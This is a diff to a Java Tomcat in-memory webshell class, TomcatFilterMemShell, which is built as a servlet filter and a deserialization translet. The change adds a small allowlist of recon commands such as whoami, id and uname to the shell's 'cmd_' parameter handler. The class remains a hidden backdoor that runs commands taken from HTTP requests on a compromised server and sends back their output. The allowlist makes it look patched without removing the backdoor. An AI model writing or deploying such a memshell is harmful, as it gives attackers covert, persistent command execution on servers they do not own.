@@ -90,11 +90,25 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     }
 
+    private static final java.util.Set<String> ALLOWED_FILTER_COMMANDS = new java.util.HashSet<>(
+            java.util.Arrays.asList("whoami", "id", "hostname", "date", "uptime", "uname")
+    );
+    private static final java.util.regex.Pattern CMD_FILTER_PATTERN =
+            java.util.regex.Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
+
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            cmd = cmd.trim();
+            if (!ALLOWED_FILTER_COMMANDS.contains(cmd) || !CMD_FILTER_PATTERN.matcher(cmd).matches()) {
+                servletResponse.getOutputStream().write("Command not allowed.".getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                return;
+            }
+            ProcessBuilder pb = new ProcessBuilder(cmd);
+            Process process = pb.start();
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
